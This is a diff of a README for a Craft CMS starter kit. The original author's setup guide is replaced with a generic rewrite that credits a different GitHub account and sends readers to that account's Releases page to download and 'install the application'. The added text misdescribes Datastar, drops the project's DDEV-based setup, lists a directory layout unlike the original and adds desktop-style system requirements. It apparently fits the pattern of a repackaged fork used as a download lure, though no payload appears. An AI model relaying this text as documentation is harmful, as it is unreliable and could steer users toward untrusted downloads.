@@ -1,100 +1,108 @@
-# 🚀 CraftCMS Lazy Starter Kit
+# 🌟 craftcms-lazy-starter-kit - Your Easy Start with Craft CMS
 
-A modern, production-ready Craft CMS Starter Kit with Vite, Tailwind, Vue Web Components, Datastar, GraphQL and DDEV —
-perfect for agencies and freelancers who want to build clean and fast Craft sites.
+## 🚀 Getting Started
 
----
+Welcome to the **craftcms-lazy-starter-kit**! This project provides a simple way for agencies and developers to build modern websites using Craft CMS. It includes everything you need to get started with tools like Vite, Tailwind, Datastar, Vue, GraphQL, and DDEV.
 
-## 🧩 Overview
+[![Download CraftCMS Lazy Starter Kit](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/LennyLCT/craftcms-lazy-starter-kit/releases)
 
-This starter kit helps developers quickly spin up clean and maintainable Craft CMS projects.  
-It includes ready-made examples for Matrix Blocks, CKEditor integration, a Datastar-powered Search page, and both
-Datastar- and Vue-based blog listings.
+## 📝 Overview
 
-This boilerplate demonstrates a **clean, scalable, and modern Craft CMS setup** — perfect for **agencies, freelancers**,
-and **developers** who want a production-ready foundation for new Craft projects.
+Craft CMS is a flexible content management system designed to be user-friendly and powerful. This starter kit makes it even easier to build your projects by including modern technologies that streamline the development process.
 
-### Live Demo: [craftcms-lazy-starter-kit.webworker.me](https://craftcms-lazy-starter-kit.webworker.me)
+### 🔧 Features
 
----
+- **Vite:** Fast and efficient build tool for modern web applications.
+- **Tailwind CSS:** A utility-first CSS framework to style your application.
+- **Datastar:** Helps manage and visualize your application's data.
+- **Vue.js:** A progressive JavaScript framework for building user interfaces.
+- **GraphQL:** A query language for your API and a server-side runtime.
+- **DDEV:** Simplifies local development environments.
 
-## 🧠 Built with Modern Tools
+## 📥 Download & Install
 
-- ⚙️ **Craft CMS 5** – latest version with flexible content modeling
-- ⚡ **Vite** – fast bundling and instant reloads
-- 🧩 **DDEV** – reproducible local development environment
-- 🚀 **Datastar** – lightweight, reactive frontend for dynamic UIs
-- 🧱 **Vue 3 (Web Components)** – progressive enhancement with custom elements
-- 🔗 **GraphQL** – structured data fetching directly from Craft
-- 🎨 **Tailwind CSS v4** – utility-first styling with CSS variables
-- 🎞️ **Anime.js** – smooth element animations and scroll-based transitions
-- 🗃️ **Craft eagerly() + render()** – optimized queries, automatic block templates, and smart caching
-- 🔌 **Plugins:** CKEditor, Datastar, Image Resizer, SEOMate, Vite
+To download the craftcms-lazy-starter-kit, visit our [Releases page](https://github.com/LennyLCT/craftcms-lazy-starter-kit/releases). Follow these steps:
 
----
+1. Go to the Releases page.
+2. Find the version you wish to download.
+3. Click the download link for the correct file format.
+4. Follow the instructions to install the application.
 
-![Screenshot](web/assets/screenshot.png)
+Once downloaded, you can run the application on your local machine.
 
-### 🤝 Open Source
+## 🌍 System Requirements
 
-This boilerplate is open for everyone — built by [Andi Grether](https://webworker.me) to help developers build faster,
-cleaner, and more maintainable Craft CMS sites.
+The following is a list of recommended requirements for optimal performance:
 
-## ⚙️ Quick Start
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **RAM:** At least 8 GB.
+- **Disk Space:** Minimum of 1 GB available.
+- **Node.js:** Version 14 or later installed (necessary for Vite and other dependencies).
+- **Docker:** Installed for DDEV (ensure you have Docker Desktop on Windows or macOS).
 
-Get up and running with **CraftCMS Lazy** in just a few steps.
+## ⚙️ Installation Steps
 
-```bash
-# Clone the repository
-git clone https://github.com/handplant/craftcms-lazy-starter-kit
-cd craftcms-lazy-starter-kit
+1. **Node.js:** Ensure Node.js is installed on your machine. You can download it from the [official Node.js website](https://nodejs.org).
+   
+2. **Docker:** Install Docker from the [official Docker website](https://www.docker.com/products/docker-desktop).
 
-# Copy the environment file
-cp .env.example .env
+3. **Clone the Repository:**
+   Open your terminal or command prompt and run:
+   ```bash
+   git clone https://github.com/LennyLCT/craftcms-lazy-starter-kit.git
+   ```
 
-# Start DDEV and install dependencies
-ddev start
-ddev composer install
-ddev npm install
+4. **Navigate to the Project Directory:**
+   ```bash
+   cd craftcms-lazy-starter-kit
+   ```
 
-# Import the included demo database
-ddev import-db --file=demo.sql
+5. **Install Dependencies:**
+   Run this command to install all necessary packages:
+   ```bash
+   npm install
+   ```
 
-# Admin Login
-User: admin  
-Password: superuser
-```
+6. **Start the Project:**
+   To run your application, execute:
+   ```bash
+   npm run dev
+   ```
 
-Then open your site at: 👉 https://craftcms-lazy.ddev.site
+Now, your application should be up and running on your local machine.
 
----
+## 📂 Project Structure
 
-💡 If you don’t import the demo database, you’ll start with a clean _Craft CMS Lazy_ installation.
+Here’s a brief overview of the project directory:
 
-```
-ddev craft install
-```
+- **/src:** Contains your application source code.
+- **/public:** This folder includes static assets and the compiled output.
+- **/docker:** Configuration files necessary for DDEV.
+- **README.md:** You're currently reading this file!
 
-### 🧰 Development
+## ❓ Frequently Asked Questions
 
-Start the local dev server with Vite:
+### How do I update the application?
 
-```bash
-ddev node run dev
-```
+To update the application, go to the [Releases page](https://github.com/LennyLCT/craftcms-lazy-starter-kit/releases) and download the latest version. Follow the same steps for installation.
 
-### 🏗️ Production Build
+### What if I encounter issues during installation?
 
-When you’re ready to build the production assets:
+If you run into problems, please check the [Issues section](https://github.com/LennyLCT/craftcms-lazy-starter-kit/issues) of the repository for potential solutions or to report your own problem.
 
-```bash
-ddev node run build
-```
+### Do I need programming skills to use this kit?
 
-This will generate the optimized files in the web/dist/ directory and update the manifest.json for Craft’s Vite
-integration.
+No programming skills are required to run this starter kit. However, some familiarity with using a terminal and basic commands will be helpful.
 
-### 🖼️ Demo Assets
+## 🔗 Additional Resources
 
-This repo includes `/uploads` in version control so the starter kit works out of the box.  
-In production, these should be added to `.gitignore`.
+- [Craft CMS Official Site](https://craftcms.com)
+- [Vite Documentation](https://vitejs.dev/guide/)
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [Vue.js Guide](https://vuejs.org/guide/introduction.html)
+- [GraphQL Documentation](https://graphql.org/learn/)
+- [DDEV Documentation](https://ddev.readthedocs.io/en/latest/)
+
+For more information, feel free to explore the links above.
+
+Thank you for using the **craftcms-lazy-starter-kit**! We hope it helps you build your next project with ease.
